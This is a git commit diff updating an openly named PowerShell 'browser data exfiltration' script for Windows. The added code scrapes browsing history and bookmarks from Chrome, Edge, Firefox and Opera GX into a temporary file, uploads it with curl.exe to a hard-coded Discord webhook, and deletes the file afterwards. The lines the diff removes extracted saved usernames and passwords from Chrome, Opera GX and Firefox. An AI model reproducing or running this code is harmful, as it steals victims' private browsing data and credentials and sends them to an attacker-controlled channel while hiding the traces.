2ba6876ec8de0ce14b543505b7a9c29425cd7185
Toun Sovanreach <45072929+Pureach@users.noreply.github.com>
2024-10-18 17:39:49 +0700

    Update Browser Data Exfiltration with Remote Script Execution.ps1

--- Browser Data Exfiltration with Remote Script Execution.ps1
+++ Browser Data Exfiltration with Remote Script Execution.ps1
@@ -4,6 +4,45 @@
 
 # Target OS: Windows 10, 11
 
+function Get-BrowserData {
+    [CmdletBinding()]
+    param (
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]$Browser,
+        [Parameter(Position = 2, Mandatory = $True)]
+        [string]$DataType
+    )
+
+    $Path = switch ($Browser) {
+        'chrome'  { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" } }
+        'edge'    { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" } }
+        'firefox' { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" } }
+        'opera'   { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" } }
+        default { Write-Host 'Unsupported browser or data type specified'; return }
+    }
+
+    if (-not (Test-Path $Path)) {
+        Write-Host "The path for $Browser $DataType could not be found."
+        return
+    }
+
+    try {
+        $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+        $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { ($_.Matches).Value } | Sort -Unique
+        $Value | ForEach-Object {
+            $Key = $_
+            New-Object -TypeName PSObject -Property @{
+                User = $env:UserName
+                Browser = $Browser
+                DataType = $DataType
+                Data = $_
+            }
+        }
+    } catch {
+        Write-Host "Failed to extract $DataType from $Browser"
+    }
+}
+
 # Define exfiltration method (Discord webhook)
 $dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'
 
@@ -13,60 +52,24 @@ if ([string]::IsNullOrEmpty($dc)) {
     exit
 }
 
-# Extract saved usernames and passwords from Chrome
-$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-if (Test-Path $chromePath) {
-    $chromeCredentials = "SELECT origin_url, username_value, password_value FROM logins"
-    $sqliteCommand = "sqlite3.exe"
-    try {
-        if (Test-Path $sqliteCommand) {
-            $chromeData = & $sqliteCommand $chromePath "$chromeCredentials"
-            Write-Output "[Chrome Credentials]: $chromeData"
-        } else {
-            Write-Host 'sqlite3.exe not found. Unable to extract Chrome credentials.'
-        }
-    } catch {
-        Write-Host 'Failed to extract Chrome credentials.'
-    }
-}
-
-# Extract saved usernames and passwords from Firefox
-$firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-if (Test-Path $firefoxProfilePath) {
-    $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
-    foreach ($profile in $firefoxProfiles) {
-        $loginsJson = Join-Path -Path $profile.FullName -ChildPath 'logins.json'
-        if (Test-Path $loginsJson) {
-            try {
-                $firefoxData = Get-Content -Path $loginsJson | ConvertFrom-Json
-                Write-Output "[Firefox Credentials]: $($firefoxData.logins)"
-            } catch {
-                Write-Host 'Failed to extract Firefox credentials.'
-            }
-        }
-    }
-}
-
-# Extract saved usernames and passwords from Opera GX
-$operaPath = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"
-if (Test-Path $operaPath) {
-    $operaCredentials = "SELECT origin_url, username_value, password_value FROM logins"
-    try {
-        if (Test-Path $sqliteCommand) {
-            $operaData = & $sqliteCommand $operaPath "$operaCredentials"
-            Write-Output "[Opera GX Credentials]: $operaData"
-        } else {
-            Write-Host 'sqlite3.exe not found. Unable to extract Opera GX credentials.'
-        }
-    } catch {
-        Write-Host 'Failed to extract Opera GX credentials.'
-    }
-}
+# Collect browser data
+$outputFile = "$env:TMP\--BrowserData.txt"
+Get-BrowserData -Browser "edge" -DataType "history" >> $outputFile
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $outputFile
+Get-BrowserData -Browser "chrome" -DataType "history" >> $outputFile
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $outputFile
+Get-BrowserData -Browser "firefox" -DataType "history" >> $outputFile
+Get-BrowserData -Browser "opera" -DataType "history" >> $outputFile
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $outputFile
 
 # Send completion notification to Discord
 try {
-    $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser credentials.' } | ConvertTo-Json
+    $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
     Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
+    curl.exe -F "file1=@$outputFile" $dc
 } catch {
     Write-Host 'Failed to send notification to Discord webhook.'
 }
+
+# Clean up
+Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
